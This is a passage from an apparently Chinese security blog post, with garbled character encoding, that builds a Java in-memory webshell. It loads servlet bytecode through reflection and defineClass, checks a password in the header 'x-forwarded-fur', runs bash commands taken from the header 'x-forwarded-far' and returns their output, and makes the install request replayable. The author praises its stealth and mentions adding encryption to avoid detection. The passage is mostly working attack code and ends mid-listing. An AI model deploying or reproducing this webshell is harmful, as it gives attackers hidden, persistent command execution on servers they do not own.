</span></span><span style=display:flex><span>            ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> <span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span> <span style=color:#75715e>//é€šè¿‡åå°„åœ¨æ¯æ¬¡æµ‹è¯•æ—¶ä¿®æ”¹è‡ªå®šä¹‰servletçš„åç§°ï¼Œè€Œä¸æ˜¯é¢‘ç¹refactoré‚£ä¸ªç±»
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            String bytecode<span style=color:#f92672>=</span>Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>            System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>bytecode<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>æ¢ä¸€ä¸ªç±»åä¹‹åå°±æŠ¥å¦ä¸€ä¸ªé”™äº† <code>Cannot cast 'java.lang.Class' to 'javax.servlet.http.HttpServlet'</code> ã€‚</p><p><img loading=lazy src=image-20220704164505582.png alt=image-20220704164505582></p><p>è¿™æ˜¯æˆ‘ä»¬çš„å†™æ³•ä¸å¯¹ï¼Œä¸èƒ½å°†ä¸€ä¸ªç±»castæˆå¦ä¸€ä¸ªç±»ï¼Œåº”è¯¥å…ˆå°†ä»–å®ä¾‹åŒ–ï¼Œå†å°†å¯¹è±¡è½¬åŒ–ä¸ºå…¶ä»–ç±»çš„çš„å¯¹è±¡ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-111-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-111-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>String pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;yv66vgAAADExxxxxxxxxâ€¦â€¦&#34;</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>byte</span><span style=color:#f92672>[]</span> code<span style=color:#f92672>=</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getDecoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>decode</span><span style=color:#f92672>(</span>pers_neo_memsHttpServlet_bytecodestr<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Method defineClass<span style=color:#f92672>=</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>.</span><span style=color:#a6e22e>getDeclaredMethod</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;defineClass&#34;</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>byte</span><span style=color:#f92672>[].</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>,</span> <span style=color:#66d9ef>int</span><span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>setAccessible</span><span style=color:#f92672>(</span><span style=color:#66d9ef>true</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>Class memsHttpServlet<span style=color:#f92672>=(</span>Class<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span> <span style=color:#75715e>//ç±»å‹è½¬æ¢
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>HttpServlet httpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span> <span style=color:#75715e>//ç±»å‹è½¬æ¢
</span></span></span></code></pre></td></tr></table></div></div><h4 id=webshellå¯†ç åˆ¤æ–­çš„å†™æ³•å‡ºé”™>webshellå¯†ç åˆ¤æ–­çš„å†™æ³•å‡ºé”™<a hidden class=anchor aria-hidden=true href=#webshellå¯†ç åˆ¤æ–­çš„å†™æ³•å‡ºé”™>#</a></h4><p>ä¸€åˆ‡éƒ½å¾ˆå¥½ï¼Œå°±æ˜¯æ²¡æœ‰ç»“æœã€‚åŸæ¥æ˜¯å› ä¸ºæˆ‘æ¯”è¾ƒå¯†ç çš„å†™æ³•ä¸å¯¹ï¼Œåº”è¯¥ä½¿ç”¨ <code>.equals</code> è€Œä¸æ˜¯ <code>==</code> ã€‚å‰è€…é»˜è®¤æ˜¯å¼•ç”¨æ¯”è¾ƒï¼Œåè€…å¯¹åŸºæœ¬ç±»å‹æ˜¯å€¼æ¯”è¾ƒï¼Œå¯¹å¼•ç”¨ç±»å‹æ˜¯å¼•ç”¨æ¯”è¾ƒã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-112-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-112-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-112-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-112-2>2</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>boolean</span> a<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>==(</span>httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>boolean</span> b<span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>httpConn<span style=color:#f92672>.</span><span style=color:#a6e22e>getServletRequest</span><span style=color:#f92672>().</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>));</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=å¢å¼ºå…¼å®¹æ— é™é‡æ”¾>å¢å¼ºå…¼å®¹ï¼Œæ— é™é‡æ”¾<a hidden class=anchor aria-hidden=true href=#å¢å¼ºå…¼å®¹æ— é™é‡æ”¾>#</a></h4><p>è‡³æ­¤å·²ç»åŸºæœ¬å®Œæˆäº†ï¼Œé™¤äº†ä¸€å¤„ç¼ºé™·ï¼Œå°±æ˜¯è‡ªå®šä¹‰çš„é‚£ä¸ªå­—èŠ‚ç çš„ç±»æ¯æ¬¡å‘é€payloadéƒ½è¦ä¿®æ”¹ç±»åï¼Œæ¯æ‰“ä¸€æ¬¡å°±è¦æ¢ä¸€ä¸ªåå­—ï¼Œé‡æ”¾è¯·æ±‚å°±ä¼šå› ä¸ºåŠ è½½ç±»å¤±è´¥è€ŒæŠ¥500çš„é”™è¯¯ï¼Œå› ä¸ºä¸èƒ½å°è¯•åŠ è½½å…¨é™å®šåå®Œå…¨ç›¸åŒçš„ç±»ã€‚</p><p>æ˜¯å¦èƒ½å°è¯•å†æ‰§è¡Œååºåˆ—åŒ–ä¹‹å‰å…ˆæœç´¢å†…å­˜ä¸­æ˜¯å¦å·²ç»æœ‰è¯¥ç‰ˆæœ¬çš„ç±»ï¼Ÿå¦‚æœå¯ä»¥çš„è¯ï¼Œå°±å¯ä»¥åå¤ä½¿ç”¨åŒä¸€ä¸ªè¯·æ±‚æ¥å¢åŠ å’Œåˆ é™¤å†…å­˜é©¬è€Œä¸ä¼šåœ¨å†…å­˜ä¸­ç•™ä¸‹å¾ˆå¤šæ— ç”¨çš„ç±»ã€‚</p><p>ç¡®å®å¯ä»¥ï¼Œä¿®æ”¹ä»£ç å®ç°å¯æ— é™é‡æ”¾å®‰è£…å†…å­˜é©¬çš„è¯·æ±‚ã€‚å¯ä»¥ä»»æ„é‡æ”¾è€Œä¸æŠ¥é”™ï¼Œä¹Ÿä¾¿äºå†å¸è½½å†…å­˜é©¬ä¹‹åé‡æ–°å®‰è£…ã€‚</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-113-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-113-7>7</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#66d9ef>try</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//in case we may want to replay memsi request æˆ‘ä»¬ä¼šæƒ³è¦é‡æ”¾åŒä¸€ä¸ªå®‰è£…å†…å­˜é©¬çš„è¯·æ±‚ï¼Œä½¿ç”¨è¿™ä¸ªtry catchå¯ä»¥å¢å¼ºå…¼å®¹æ€§ã€‚
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    memsHttpServlet<span style=color:#f92672>=(</span>Class<span style=color:#f92672>)</span>defineClass<span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>ClassLoader<span style=color:#f92672>.</span><span style=color:#a6e22e>getSystemClassLoader</span><span style=color:#f92672>(),</span>code<span style=color:#f92672>,</span><span style=color:#ae81ff>0</span><span style=color:#f92672>,</span>code<span style=color:#f92672>.</span><span style=color:#a6e22e>length</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span><span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>InvocationTargetException e<span style=color:#f92672>){</span>
</span></span><span style=display:flex><span>    memsHttpServlet<span style=color:#f92672>=</span>Class<span style=color:#f92672>.</span><span style=color:#a6e22e>forName</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;pers.neo.memsHttpServletb&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>HttpServlet httpServlet<span style=color:#f92672>=(</span>HttpServlet<span style=color:#f92672>)</span>memsHttpServlet<span style=color:#f92672>.</span><span style=color:#a6e22e>newInstance</span><span style=color:#f92672>();</span>
</span></span></code></pre></td></tr></table></div></div><p>è‡³æ­¤åŸºæœ¬å®Œç¾ã€‚</p><h3 id=ä¼˜ç¼ºç‚¹-4>ä¼˜ç¼ºç‚¹<a hidden class=anchor aria-hidden=true href=#ä¼˜ç¼ºç‚¹-4>#</a></h3><p>ä¼˜ç‚¹ï¼š</p><ol><li>å®ç°ä»»æ„å®‰è£…ï¼Œå¸è½½ï¼Œç¨³å®šè€Œéšç§˜çš„å‘½ä»¤æ‰§è¡Œå’Œå›æ˜¾ã€‚</li></ol><p>ç¼ºç‚¹ï¼š</p><ol><li>æœ€å¼€å§‹è§‰å¾—æ˜¯å®Œç¾çš„ï¼Œé™¤äº†é‡å¯JVMä¼šå¤±å»shellã€‚</li><li>å®æˆ˜å‘Šè¯‰æˆ‘éœ€è¦è¿˜å¢åŠ æµé‡åŠ å¯†åŠŸèƒ½ï¼Œç›´æ¥å°†å‘½ä»¤æš´éœ²åœ¨HTTPè¯·æ±‚ä¸­å¾ˆå®¹æ˜“è¢«æ£€æµ‹åˆ°ã€‚</li></ol><h3 id=æœ€ç»ˆæ•ˆæœ-6>æœ€ç»ˆæ•ˆæœ<a hidden class=anchor aria-hidden=true href=#æœ€ç»ˆæ•ˆæœ-6>#</a></h3><p><img loading=lazy src=image-20220704174122975.png alt=image-20220704174122975></p><p>è‡ªå®šä¹‰çš„httpservletï¼šmemsHttpServlet.java</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-114-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-114-21>21</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServlet<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletRequest<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javax.servlet.http.HttpServletResponse<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>memsHttpServlet</span> <span style=color:#66d9ef>extends</span> HttpServlet <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>@Override</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>protected</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>doGet</span><span style=color:#f92672>(</span>HttpServletRequest req<span style=color:#f92672>,</span> HttpServletResponse resp<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String passwd<span style=color:#f92672>=</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-fur&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span><span style=color:#f92672>(!</span><span style=color:#e6db74>&#34;p4ssw0rd!&#34;</span><span style=color:#f92672>.</span><span style=color:#a6e22e>equals</span><span style=color:#f92672>(</span>passwd<span style=color:#f92672>)){</span><span style=color:#66d9ef>return</span><span style=color:#f92672>;}</span>
</span></span><span style=display:flex><span>        String<span style=color:#f92672>[]</span> cmdarray<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> String<span style=color:#f92672>[]{</span><span style=color:#e6db74>&#34;bash&#34;</span><span style=color:#f92672>,</span><span style=color:#e6db74>&#34;-c&#34;</span><span style=color:#f92672>,</span>req<span style=color:#f92672>.</span><span style=color:#a6e22e>getHeader</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;x-forwarded-far&#34;</span><span style=color:#f92672>)};</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span> s <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Scanner</span><span style=color:#f92672>(</span>Runtime<span style=color:#f92672>.</span><span style=color:#a6e22e>getRuntime</span><span style=color:#f92672>().</span><span style=color:#a6e22e>exec</span><span style=color:#f92672>(</span>cmdarray<span style=color:#f92672>).</span><span style=color:#a6e22e>getInputStream</span><span style=color:#f92672>()).</span><span style=color:#a6e22e>useDelimiter</span><span style=color:#f92672>(</span><span style=color:#e6db74>&#34;\\A&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            resp<span style=color:#f92672>.</span><span style=color:#a6e22e>getWriter</span><span style=color:#f92672>().</span><span style=color:#a6e22e>write</span><span style=color:#f92672>(</span>s<span style=color:#f92672>.</span><span style=color:#a6e22e>hasNext</span><span style=color:#f92672>()</span> <span style=color:#f92672>?</span> s<span style=color:#f92672>.</span><span style=color:#a6e22e>next</span><span style=color:#f92672>()</span> <span style=color:#f92672>:</span> <span style=color:#e6db74>&#34;&#34;</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>Exception e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> RuntimeException<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span><span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¸ºhttpservletç”Ÿæˆå­—èŠ‚ç ï¼šmemsHttpServletGenByteCode.java</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-115-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-115-16>16</a>
